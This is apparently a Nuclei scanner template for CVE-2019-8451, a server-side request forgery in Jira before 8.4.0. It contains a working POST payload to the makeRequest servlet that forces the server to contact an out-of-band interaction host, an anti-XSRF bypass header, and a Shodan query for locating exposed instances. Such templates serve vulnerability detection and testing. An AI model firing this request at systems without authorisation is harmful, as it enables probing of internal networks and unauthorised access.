id: CVE-2019-8451

info:
  name: Jira <8.4.0 - 服务端请求伪造(CVE-2019-8451)
  author: TechbrunchFR
  severity: medium
  description: Jira before 8.4.0 is susceptible to server-side request forgery. The /plugins/servlet/gadgets/makeRequest resource contains a logic bug in the JiraWhitelist class, which can allow an attacker to access the content of internal network resources and thus modify data, and/or execute unauthorized operations.
  metadata:
    max-request: 1
    shodan-query: http.component:"Atlassian Jira"
  tags: jira

http:
  - method: POST
    path:
      - '{{BaseURL}}/plugins/servlet/gadgets/makeRequest'

    body: |
      url=https://{{Host}}:443@{{interactsh}}/{{url}}

    headers:
      X-Atlassian-Token: no-check
      Content-Type: application/x-www-form-urlencoded

    matchers:
      - type: word
        part: interactsh_protocol
        words:
          - "http" # Confirms the HTTP Interaction
